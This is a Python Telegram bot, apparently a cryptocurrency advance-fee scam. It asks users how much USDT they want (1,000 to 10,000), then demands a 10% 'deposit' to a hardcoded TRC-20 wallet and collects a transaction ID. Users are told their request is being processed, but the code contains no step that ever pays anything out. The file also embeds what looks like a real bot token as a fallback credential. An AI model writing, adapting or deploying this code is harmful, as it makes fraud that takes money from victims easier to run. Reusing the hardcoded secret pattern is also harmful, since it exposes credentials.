import os
import threading
import logging
import requests
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# ----------------- FLASK DUMMY SERVER (FOR RENDER) -----------------
server = Flask(__name__)

@server.route("/")
def home():
    return "Bot is alive and running 24/7!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    server.run(host="0.0.0.0", port=port)

# ----------------- TELEGRAM BOT CONFIG -----------------
BOT_TOKEN = os.environ.get("BOT_TOKEN", "9034747442:AAGTyaKiyCjS02QWpo8Bk2ilZUsmP6ghyJc")
WALLET_ADDRESS = "TBZbn9gnVwg2Jam5YdVgjzDxtRyoEr6DYr"
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", None)

AMOUNT, AWAIT_CONFIRM, AWAIT_HASH = range(3)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = (
        "Welcome!\n\n"
        "Please enter the amount of USDT you require.\n"
        "• Minimum: 1,000 USDT\n"
        "• Maximum: 10,000 USDT\n\n"
        "Enter the numeric amount below:"
    )
    await update.message.reply_text(welcome_text)
    return AMOUNT

async def handle_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().replace(",", "")
    try:
        amount = float(text)
    except ValueError:
        await update.message.reply_text("Invalid input. Please enter a valid number between 1,000 and 10,000.")
        return AMOUNT

    if amount < 1000 or amount > 10000:
        await update.message.reply_text("The amount must be between 1,000 and 10,000 USDT. Please try again:")
        return AMOUNT

    fee = amount * 0.10
    context.user_data["requested_amount"] = amount
    context.user_data["fee_amount"] = fee

    response_text = (
        f"<b>Requested Amount:</b> {amount:,.2f} USDT\n"
        f"<b>Required Deposit (10%):</b> {fee:,.2f} USDT\n\n"
        f"Please send <b>{fee:,.2f} USDT (TRC-20)</b> to the wallet address below:\n\n"
        f"<code>{WALLET_ADDRESS}</code>\n\n"
        "<i>(Tap the address above to copy)</i>\n\n"
        "After completing the transfer, click the button below to confirm."
    )

    keyboard = [[InlineKeyboardButton("✅ I Have Paid", callback_data="paid_confirm")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(response_text, parse_mode="HTML", reply_markup=reply_markup)
    return AWAIT_CONFIRM

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "paid_confirm":
        await query.edit_message_reply_markup(reply_markup=None)
        await query.message.reply_text(
            "Please submit your <b>Transaction Hash (TxID)</b> below:",
            parse_mode="HTML"
        )
        return AWAIT_HASH

async def handle_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tx_hash = update.message.text.strip()
    user = update.effective_user
    requested = context.user_data.get("requested_amount", 0)
    fee = context.user_data.get("fee_amount", 0)

    if len(tx_hash) != 64:
        await update.message.reply_text(
            "⚠️ Invalid Transaction Hash format. A standard TRON TxID is 64 characters long.\n"
            "Please check and send the correct hash:"
        )
        return AWAIT_HASH

    status_note = "Pending Verification"
    try:
        url = f"https://apilist.tronscanapi.com/api/transaction-info?hash={tx_hash}"
        res = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
        data = res.json()
        if data.get("confirmed"):
            status_note = "Confirmed on TRON Network"
    except Exception:
        pass

    success_text = (
        "<b>Your request has been successfully submitted!</b>\n\n"
        f"<b>Requested:</b> {requested:,.2f} USDT\n"
        f"<b>Deposit:</b> {fee:,.2f} USDT\n"
        f"<b>TxID:</b> <code>{tx_hash}</code>\n\n"
        "Our team will verify the blockchain confirmation and process your request shortly."
    )
    await update.message.reply_text(success_text, parse_mode="HTML")

    logging.info(
        f"NEW SUBMISSION | User: @{user.username} (ID: {user.id}) | "
        f"Req: {requested} USDT | Fee: {fee} USDT | Tx: {tx_hash} | Status: {status_note}"
    )

    if ADMIN_CHAT_ID:
        admin_text = (
            f"🔔 <b>New Request Submitted</b>\n\n"
            f"<b>User:</b> @{user.username} (ID: <code>{user.id}</code>)\n"
            f"<b>Requested USDT:</b> {requested:,.2f}\n"
            f"<b>Expected 10%:</b> {fee:,.2f} USDT\n"
            f"<b>TxID:</b> <code>{tx_hash}</code>\n"
            f"<b>Tronscan:</b> https://tronscan.org/#/transaction/{tx_hash}"
        )
        try:
            await context.bot.send_message(chat_id=int(ADMIN_CHAT_ID), text=admin_text, parse_mode="HTML")
        except Exception as e:
            logging.error(f"Admin alert failed: {e}")

    context.user_data.clear()
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("Process cancelled. Send /start to begin again.")
    return ConversationHandler.END

def run_bot():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_amount)],
            AWAIT_CONFIRM: [CallbackQueryHandler(button_callback)],
            AWAIT_HASH: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_hash)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    app.add_handler(conv_handler)
    app.run_polling()

if __name__ == "__main__":
    # Flask સર્વર અલગ થ્રેડમાં ચાલુ કરવું
    threading.Thread(target=run_web, daemon=True).start()
    # બોટ શરૂ કરવો
    run_bot()
